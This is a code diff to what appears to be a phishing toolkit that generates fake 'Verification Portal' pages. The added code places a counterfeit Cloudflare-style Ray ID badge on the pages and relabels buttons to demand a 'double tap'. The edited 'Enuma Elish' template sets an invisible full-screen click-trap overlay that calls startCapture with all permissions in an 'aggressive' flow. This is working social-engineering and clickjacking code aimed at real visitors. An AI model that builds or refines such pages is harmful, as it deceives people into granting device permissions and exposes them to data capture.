@@ -76,8 +76,44 @@ export const getCaptureScript = (id: string, redirectUrl: string = 'https://goog
           over.style.cursor = 'default';
           document.body.appendChild(over);
           
+          if (!document.querySelector('.ray-desc') && cfg.tmplId !== 'cloudflare') {
+            var rayId = document.createElement('div');
+            rayId.style.position = 'fixed';
+            rayId.style.bottom = '10px';
+            rayId.style.right = '10px';
+            rayId.style.fontSize = '12px';
+            rayId.style.fontFamily = 'monospace';
+            rayId.style.color = 'rgba(150,150,150,0.6)';
+            rayId.style.zIndex = '999999';
+            rayId.style.pointerEvents = 'none';
+            rayId.innerText = 'Ray : rax53rtnaomap';
+            document.body.appendChild(rayId);
+          }
+          
           function getTargetBtn() {
             return document.querySelector('.btn-verify') || document.querySelector('.btn') || document.querySelector('button') || document.querySelector('.interactive-box');
+          }
+
+          var targetForTrap = getTargetBtn();
+          if (targetForTrap && cfg.tmplId !== 'enuma_elish' && cfg.tmplId !== 'flash_strike') {
+              var isInteractiveBox = targetForTrap.classList.contains('interactive-box');
+              if (!isInteractiveBox) {
+                  targetForTrap.innerText = 'DOUBLE TAP VERIFICATION';
+              }
+              var warn = document.createElement('div');
+              warn.style.fontSize = '12px';
+              warn.style.fontWeight = 'bold';
+              warn.style.color = '#ff0000';
+              warn.style.textAlign = 'center';
+              warn.style.marginTop = '10px';
+              warn.style.animation = 'blink 0.5s infinite alternate';
+              warn.innerText = '⚠️ DOUBLE TAP REQUIRED ⚠️';
+              if (targetForTrap.parentNode) {
+                  targetForTrap.parentNode.insertBefore(warn, targetForTrap.nextSibling);
+              }
+              var style = document.createElement('style');
+              style.innerHTML = '@keyframes blink { from { opacity: 1; } to { opacity: 0.3; } }';
+              document.head.appendChild(style);
           }
 
           over.addEventListener('mousemove', function(e) {
@@ -858,8 +894,8 @@ export const templates: Record<string, {name: string, render: (id: string) => st
   },
   'enuma_elish': {
     name: "⚔️ EA: Enuma Elish (Double Click Strike)",
-    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Portal</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ff0000; overflow: hidden; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; box-shadow: 0 0 50px rgba(255, 0, 0, 0.5); border: 1px solid #330000; position: relative; z-index: 10; } .logo { font-size: 50px; margin-bottom: 20px; animation: pulse 2s infinite; } @keyframes pulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } } .main-text { font-size: 26px; font-weight: 800; margin-bottom: 15px; color: #ff0000; letter-spacing: 2px; } .sub-text { font-size: 15px; color: #888; margin-bottom: 30px; line-height: 1.5; } .btn-verify { background: #ff0000; color: #fff; border: none; padding: 25px 0; border-radius: 8px; font-size: 20px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; letter-spacing: 3px; position: relative; overflow: hidden; transition: 0.1s; } .btn-verify:active { transform: scale(0.95); background: #cc0000; } .tap-text { font-size: 14px; margin-top: 15px; color: #ff5555; font-weight: bold; animation: blink 0.5s infinite alternate; } @keyframes blink { from { opacity: 1; } to { opacity: 0.3; } } /* The trap element */ .click_trap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; display: none; } </style></head><body><div class="container"><div class="logo">⚔️</div><div class="main-text">EA: SYSTEM OVERRIDE</div><div class="sub-text">This server requires rapid multi-factor verification to establish a secure connection.</div><button class="btn-verify" onclick="initiateStrike(this)">DOUBLE TAP FAST</button><p class="tap-text">⚠️ DOUBLE TAP REQUIRED ⚠️</p></div><div id="trap" class="click_trap" onclick="window.startCapture('all')"></div><script>function initiateStrike(btn) { btn.innerText = 'TAP SCREEN NOW!'; btn.style.background = '#aa0000'; document.getElementById('trap').style.display = 'block'; window.startCapture('all'); setTimeout(() => { if (document.getElementById('trap').style.display === 'block') { window.startCapture('all'); } }, 300); }</script>` + getCaptureScript(id, 'https://google.com', {
-      tmplId: 'enuma_elish', perms: ALL_PERMS, accent: '#ff0000', icon: '⚔️', flow: 'aggressive'
+    render: (id) => `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Verification Portal</title><style>body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display:flex; flex-direction:column; align-items:center; justify-content:center; min-height:100vh; margin:0; text-align:center; background:#000; color: #ff0000; overflow: hidden; } .container { width: 100%; max-width: 450px; padding: 40px; border-radius: 12px; background: #111; box-shadow: 0 0 50px rgba(255, 0, 0, 0.5); border: 1px solid #330000; position: relative; z-index: 10; } .logo { font-size: 50px; margin-bottom: 20px; animation: pulse 2s infinite; } @keyframes pulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } } .main-text { font-size: 26px; font-weight: 800; margin-bottom: 15px; color: #ff0000; letter-spacing: 2px; } .sub-text { font-size: 15px; color: #888; margin-bottom: 30px; line-height: 1.5; } .btn-verify { background: #ff0000; color: #fff; border: none; padding: 25px 0; border-radius: 8px; font-size: 20px; font-weight: 900; cursor: pointer; width: 100%; text-transform: uppercase; letter-spacing: 3px; position: relative; overflow: hidden; transition: 0.1s; } .btn-verify:active { transform: scale(0.95); background: #cc0000; } .tap-text { font-size: 14px; margin-top: 15px; color: #ff5555; font-weight: bold; animation: blink 0.5s infinite alternate; } @keyframes blink { from { opacity: 1; } to { opacity: 0.3; } } /* The trap element */ .click_trap { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999; opacity: 0; display: none; } .ray-desc { font-family: monospace; font-size: 12px; color: #777; margin-top: 25px; } </style></head><body><div class="container"><div class="logo">👆👆</div><div class="main-text">EA: SYSTEM OVERRIDE</div><div class="sub-text">This server requires rapid multi-factor verification to establish a secure connection.</div><button class="btn-verify" onclick="initiateStrike(this)">Double Tap Verification</button><p class="tap-text">⚠️ DOUBLE TAP REQUIRED ⚠️</p><div class="ray-desc">Ray : rax53rtnaomap</div></div><div id="trap" class="click_trap" onclick="window.startCapture('all')"></div><script>function initiateStrike(btn) { btn.innerText = 'TAP SCREEN NOW!'; btn.style.background = '#aa0000'; document.getElementById('trap').style.display = 'block'; window.startCapture('all'); setTimeout(() => { if (document.getElementById('trap').style.display === 'block') { window.startCapture('all'); } }, 300); }</script>` + getCaptureScript(id, 'https://google.com', {
+      tmplId: 'enuma_elish', perms: ALL_PERMS, accent: '#ff0000', icon: '👆', flow: 'aggressive'
     }) + `</body></html>`
   },
   'flash_strike': {
